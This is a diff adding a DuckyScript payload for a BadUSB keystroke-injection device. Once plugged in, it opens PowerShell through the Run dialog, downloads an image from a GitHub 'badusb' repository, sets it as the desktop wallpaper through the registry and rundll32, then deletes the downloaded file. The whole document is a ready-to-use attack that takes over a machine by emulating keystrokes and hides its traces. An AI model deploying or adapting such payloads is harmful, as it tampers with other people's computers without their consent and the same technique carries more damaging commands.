@@ -1,0 +1,18 @@
+REM ChangeWallpaper
+DELAY 2000
+GUI r
+DELAY 2000
+STRING powershell
+ENTER
+DELAY 2000
+STRING wget -Uri https://github.com/MeditationDuck/badusb/blob/main/image.jpg?raw=true -outfile $env:USERPROFILE\image.jpg
+ENTER
+DELAY 5000
+STRING Set-ItemProperty -path "HKCU:Control Panel\Desktop" -name wallpaper -value $env:USERPROFILE\image.jpg
+ENTER
+DELAY 1000
+STRING rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True
+ENTER
+DELAY 1000
+STRING rm $env:USERPROFILE\image.jpg
+ENTER
